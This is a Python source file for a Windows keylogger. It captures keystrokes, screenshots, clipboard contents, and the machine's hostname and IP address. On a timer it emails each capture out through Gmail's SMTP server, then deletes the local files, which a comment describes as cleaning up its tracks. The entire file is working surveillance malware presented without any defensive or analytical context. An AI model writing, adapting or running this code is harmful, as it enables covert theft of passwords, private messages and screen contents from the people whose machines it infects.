#!/usr/bin/env python

# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import time
import os

# Start up instances of files and paths
system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"

file_path = " "# "C:\\Users\\Public\\Roaming"

time_iteration = 120

# Email Controls
email_address = ""
password = ""

# Send to email
def send_email(filename, attachment):
	fromaddr = email_address
	toaddr = email_address
	
	msg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "Log File"

	body = "Body_of_the_mail"

	msg.attach(MIMEText(body, 'plain'))
	
	filename = filename
	attachment = open(attachment, "rb")

	p = MIMEBase('application', 'octet-stream')

	p.set_payload((attachment).read())
	encoders.encode_base64(p)
	p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

	msg.attach(p)	
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.starttls()

	s.login(fromaddr, password)
	text = msg.as_string()
	s.sendmail(fromaddr, toaddr, text)

	s.quit()

# Gather computer and network information
def computer_information():
	with open(file_path  + system_information, "a") as f:
		hostname = socket.gethostname()
		IPAddr = socket.gethostbyname(hostname)
		
		f.write("Processor: " + (platform.processor() +"\n"))
		f.write("System: " + platform.system() + " " + platform.version() + "\n")
		f.write("Machine: " + platform.machine() + "\n")
		f.write("Hostname: " + hostname + "\n")
		f.write("IP Address: " + IPAddr + "\n")

computer_information()
send_email(system_information, file_path + system_information)

# Gather clipboard contents
def copy_clipboard():
	with open(file_path  + clipboard_information, "a") as f:
		try:
			win32clipboard.OpenClipboard()
			pasted_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			
			f.write("Clipboard Data: \n" + pasted_data)
			
		except:
			f.write("Clipboard could not be copied.")

# Screenshot functionalities
def screenshot():
	im = ImageGrab.grab()
	im.save(file_path  + screenshot_information)
	
# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while True:
	
	count = 0
	keys = ""
	counter = 0
	
	def on_press(key):
		global keys, count, currentTime
		
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = " "
			elif key == key.esc:
				print("Exiting program...")
				return False
			else:
				current_key = str(key)
		keys+= current_key
		print(current_key)
		count += 1
		currentTime = time.time()
		
		if count >= 1:
			count = 0
			write_file(keys)
			keys = " "
			
	def write_file(keys):
		with open(file_path  + keys_information, "a") as f:
			f.write(keys)
			f.close()
					
	def on_release(key):
		if key == Key.esc:
			return False
		if currentTime > stoppingTime:
			return False
			
	

	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

	if currentTime > stoppingTime:
		# Send keylogger contents to email
		send_email(keys_information, file_path  + keys_information)
		# Clear contents of keylogger log file.
		with open(file_path  + keys_information, "w") as f:
			f.write(" ")
		# Take screenshot and send email
		screenshot()
		send_email(screenshot_information, file_path  + screenshot_information)
		# Gather clipboard contents and send to email
		copy_clipboard()
		send_email(clipboard_information, file_path  + clipboard_information)
		
		# Update current time
		currentTime = time.time()
		stoppingTime = time.time() + time_iteration
	
		#Delete files - clean up our tracks
		delete_files = [system_information, clipboard_information, screenshot_information, keys_information]
		for file in delete_files:
			os.remove(file_path  +file)
		

